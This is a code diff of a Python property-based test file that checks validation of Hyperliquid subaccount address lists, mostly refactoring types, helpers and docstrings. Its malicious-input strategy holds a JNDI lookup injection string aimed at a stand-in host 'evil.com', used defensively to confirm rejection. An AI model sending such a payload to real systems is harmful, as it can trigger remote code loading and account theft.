@@ -15,7 +15,6 @@ Property testing ensures comprehensive coverage of subaccount edge cases and adv
 """
 
 import string
-from typing import Any
 
 import pytest
 from hypothesis import assume, given, strategies as st
@@ -29,13 +28,49 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = (
+    str
+    | int
+    | float
+    | bool
+    | list[str]
+    | dict[str, str]
+    | bytes
+    | list[int]
+    | list[None]
+    | list[dict[str, str]]
+    | list[list[str]]
+    | None
+)
+
+
+# =============================================================================
+# HELPER FUNCTIONS FOR STRATEGY BUILDERS
+# =============================================================================
+
+
+def _build_hex_address(hex_part: str) -> str:
+    """Build hex address with 0x prefix."""
+    return f"0x{hex_part}"
+
+
+def _build_address_with_prefix(prefix: str, hex_part: str) -> str:
+    """Build address with custom prefix."""
+    return f"{prefix}{hex_part}"
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR SUBACCOUNTS MODEL TESTING
 # =============================================================================
 
 
 def valid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses for subaccounts."""
+    """Generate valid Ethereum addresses for subaccounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid addresses
         st.sampled_from([
@@ -48,14 +83,18 @@ def valid_ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated valid addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate invalid Ethereum address strings."""
+    """Generate invalid Ethereum address strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Wrong length
         st.text(min_size=1, max_size=39, alphabet=string.hexdigits),
@@ -64,13 +103,13 @@ def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
         st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         # Wrong prefix
         st.builds(
-            lambda prefix, hex_part: f"{prefix}{hex_part}",
+            _build_address_with_prefix,
             st.sampled_from(["0X", "1x", "x", "00x", ""]),
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
         # Invalid characters
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(
                 min_size=40,
                 max_size=40,
@@ -88,7 +127,11 @@ def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_subaccounts_list_strategy(draw: DrawFn) -> list[str]:
-    """Generate valid lists of Ethereum addresses."""
+    """Generate valid lists of Ethereum addresses.
+
+    Returns:
+        list[str]: Generated test data.
+    """
     return draw(
         st.lists(
             valid_ethereum_address_strategy(),
@@ -98,8 +141,12 @@ def valid_subaccounts_list_strategy(draw: DrawFn) -> list[str]:
     )
 
 
-def malicious_subaccounts_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for subaccounts security testing."""
+def malicious_subaccounts_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for subaccounts security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Subaccount manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-accounts}"),
@@ -153,12 +200,12 @@ class TestHyperliquidRawSubAccountsResponseProperties:
 
     @given(subaccounts_list=valid_subaccounts_list_strategy())
     def test_subaccounts_validation_success_properties(self, subaccounts_list: list[str]) -> None:
-        """Property: Valid subaccounts list should always create valid HyperliquidRawSubAccountsResponse objects."""
+        """Property: Valid subaccounts list should create valid response."""
         # Skip invalid data
         try:
             # Validate all addresses
             for address in subaccounts_list:
-                assume(isinstance(address, str))
+                assume(address)  # Assume non-empty
                 assume(len(address) == 42)  # 0x + 40 hex chars
                 assume(address.startswith("0x"))
                 assume(all(c in string.hexdigits for c in address[2:]))
@@ -181,8 +228,10 @@ class TestHyperliquidRawSubAccountsResponseProperties:
             assert isinstance(obj.root[i], str)
 
     @given(malicious_value=malicious_subaccounts_strategy())
-    def test_subaccounts_security_boundary_properties(self, malicious_value: Any) -> None:
-        """Property: Subaccounts response should reject malicious inputs safely."""
+    def test_subaccounts_security_boundary_properties(
+        self, malicious_value: MaliciousInput
+    ) -> None:
+        """Property: Subaccounts response should reject malicious inputs."""
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
             HyperliquidRawSubAccountsResponse.model_validate(malicious_value)
@@ -197,7 +246,7 @@ class TestHyperliquidRawSubAccountsResponseProperties:
         """Property: Subaccounts list with any invalid address should be rejected."""
         # Insert invalid address at random position
         position = 0 if not valid_addresses else len(valid_addresses) // 2
-        mixed_list = valid_addresses[:position] + [invalid_address] + valid_addresses[position:]
+        mixed_list = [*valid_addresses[:position], invalid_address, *valid_addresses[position:]]
 
         # Property: Mixed list with invalid address should be rejected
         with pytest.raises(ValidationError):
@@ -213,7 +262,7 @@ class TestHyperliquidRawSubAccountsResponseProperties:
             st.lists(st.text()),
         ])
     )
-    def test_subaccounts_invalid_item_types_properties(self, invalid_item: Any) -> None:
+    def test_subaccounts_invalid_item_types_properties(self, invalid_item: MaliciousInput) -> None:
         """Property: Subaccounts list should reject non-string items."""
         # Create list with invalid item
         invalid_list = ["0x1234567890abcdef1234567890abcdef12345678", invalid_item]
@@ -302,7 +351,7 @@ class TestHyperliquidRawSubAccountsResponseProperties:
         # Skip invalid data
         try:
             for address in subaccounts_list:
-                assume(isinstance(address, str) and len(address) == 42)
+                assume(len(address) == 42)
                 assume(address.startswith("0x"))
         except (TypeError, IndexError):
             assume(False)
@@ -350,18 +399,15 @@ class TestHyperliquidRawSubAccountsIntegrationProperties:
         malicious_value=malicious_subaccounts_strategy(),
     )
     def test_subaccounts_batch_processing_properties(
-        self, valid_lists: list[list[str]], malicious_value: Any
+        self, valid_lists: list[list[str]], malicious_value: MaliciousInput
     ) -> None:
         """Property: Multiple subaccounts responses should be processed independently."""
-        valid_responses = []
+        valid_responses: list[HyperliquidRawSubAccountsResponse] = []
 
         for subaccounts_list in valid_lists:
             # Skip invalid lists
             try:
-                if not all(
-                    isinstance(addr, str) and len(addr) == 42 and addr.startswith("0x")
-                    for addr in subaccounts_list
-                ):
+                if not all(len(addr) == 42 and addr.startswith("0x") for addr in subaccounts_list):
                     continue
 
                 response = HyperliquidRawSubAccountsResponse.model_validate(subaccounts_list)
@@ -385,8 +431,10 @@ class TestHyperliquidRawSubAccountsIntegrationProperties:
                 HyperliquidRawSubAccountsResponse.model_validate(malicious_value)
 
     @given(complete_malicious_data=malicious_subaccounts_strategy())
-    def test_subaccounts_adversarial_input_properties(self, complete_malicious_data: Any) -> None:
-        """Property: Subaccounts model should safely handle complete adversarial input."""
+    def test_subaccounts_adversarial_input_properties(
+        self, complete_malicious_data: MaliciousInput
+    ) -> None:
+        """Property: Subaccounts model should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawSubAccountsResponse.model_validate(complete_malicious_data)
